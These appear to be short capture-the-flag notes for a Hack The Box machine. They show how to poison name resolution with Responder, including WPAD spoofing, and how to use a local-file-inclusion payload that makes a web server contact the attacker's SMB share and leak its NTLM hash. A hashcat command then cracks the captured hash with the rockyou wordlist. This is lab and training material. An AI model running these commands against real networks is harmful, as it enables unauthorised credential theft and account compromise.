https://blog.geoda-security.com/2018/05/gaining-foothold-using-responder-to.html
https://systemweakness.com/htb-lessons-learned-ntlm-hash-grabing-using-responder-39dcd4a64406

```
IP=<IP>
printf "%s\t%s\n\n" "$IP" "unika.htb" | sudo tee -a /etc/hosts
```

```
responder -I tun0
```
###### WPAD
```
responder -I tun0 -wd
```
###### LFI - GET NTLM HASH
```
https://example.com/?page=//<local-ip>/test
```
###### CRACK HASH
```
hashcat -a 0 -m 5600 responder-ntlmv2 /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt
```